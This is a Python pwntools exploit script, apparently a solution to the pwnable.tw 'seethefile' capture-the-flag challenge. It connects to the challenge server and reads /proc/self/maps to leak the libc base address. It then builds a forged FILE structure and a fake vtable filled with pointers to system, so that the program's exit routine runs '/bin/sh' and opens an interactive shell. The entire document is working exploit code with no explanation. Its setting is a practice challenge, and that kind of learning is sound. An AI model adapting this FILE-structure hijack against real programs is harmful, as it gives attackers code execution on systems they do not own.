from pwn import *


#r= process("./seethefile")
r = remote("chall.pwnable.tw",10200)
pause()
libc = ELF("libc_seethefile")

name = 0x804b260

def open(file):
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(file)
	r.recvuntil("choice :")

def read():
	r.sendline("2")
	r.recvuntil("choice :")

def write():
	r.sendline("3")
	return r.recvrepeat(1)

def exit(name):
	r.sendline("5")
	r.recvuntil("name :")
	r.sendline(name)

open("/proc/self/maps")
read()
write()

read()

#libc_base = int("0x"+write().split("-")[0][2:],16) #LOCAL
libc_base = int("0x"+write().split("\n")[1].split("-")[0],16) #REMOTE

system = libc_base + libc.symbols["system"] #0x3cd10
print "Libc base @",hex(libc_base)



fake = ""
fake += p32(0)*8
fake += p32(name+0x24) #Should Point to <fp>
fake += "/bin/sh\x00"

fake_struct = p32(0)*11
fake_struct += p32(name)
fake_struct += p32(0x3)
fake_struct += p32(0)*3
fake_struct += p32(name)
fake_struct += p32(0xffffffff)*2
fake_struct += p32(0)
fake_struct += p32(name)
fake_struct += p32(0)*14

io_jump = p32((name+0x24)+(len(fake_struct)+4)+0x8)

fake_jumps = p32(0)*2
fake_jumps += p32(system)*15
fake_jumps += p32(system)


final = fake + fake_struct + io_jump + fake_jumps

exit(final)
r.interactive()
